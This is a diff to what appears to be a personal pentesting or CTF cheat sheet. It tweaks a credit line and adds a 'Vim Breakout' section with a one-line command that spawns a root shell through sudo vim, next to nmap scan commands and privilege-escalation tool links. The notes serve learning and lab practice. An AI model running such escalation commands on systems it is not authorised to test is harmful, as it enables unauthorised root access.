@@ -233,7 +233,7 @@ mk@0x01:~$ export ports = $(nmap -p- --min-rate=1000 -T4 $ip | grep ^[0-9] | cut
 
 mk@0x01:~$ nmap -sC -sV -oN nmap/initial -p$ports $ip
 ```
-Thanks go to [John Hammond](https://youtube.com/johnhammond010) for showcasing this in many a video.
+Shout out to [John Hammond](https://youtube.com/johnhammond010) for showcasing this in many a video.
 
 ## Privilege Escalation
 
@@ -243,3 +243,12 @@ Thanks go to [John Hammond](https://youtube.com/johnhammond010) for showcasing t
 | PEASS-ng | [Github: PEASS-ng](https://github.com/carlospolop/PEASS-ng) | Privilege Escalation Awesome Scripts Suite |
 | GTFOBins | [gtfobins.github.io](https://gtfobins.github.io) | Curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems. Useful for privilege escalation on a box where you have to live off the land. |
 
+### Vim Breakout
+
+If you can run vim as a super user via sudo, it doesn't drop elevated privileges when spawning a shell from vim itself.
+
+```console
+sudo vim -c ':!/bin/sh'
+```
+
+The above will spawn a new shell. Then jump into Bash and have at it :)
